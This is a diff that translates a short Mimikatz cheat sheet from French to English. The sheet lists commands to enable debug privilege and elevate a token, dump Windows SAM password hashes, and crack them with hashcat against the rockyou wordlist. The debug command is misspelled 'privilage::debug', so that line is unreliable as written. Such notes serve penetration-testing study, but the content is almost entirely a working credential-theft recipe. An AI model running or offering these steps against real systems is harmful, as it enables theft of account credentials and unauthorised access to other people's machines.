@@ -1,20 +1,20 @@
 # Mimikatz
 
-Toujours executer ses commandes avant toutes action avec mimikatz
+Always execute these commands before any action with mimikatz
 
 ```sh
 privilage::debug
 token::elevate
 ```
 
-Vider les hash 
+Dump hashes
 
 ```sh
 lsadump::sam
 lsadump::sam /path
 ```
 
-Déchiffrez ces hachages avec hashcat
+Crack these hashes with hashcat
 
 ```sh
 hashcat -m 1000 <hash> rockyou.txt
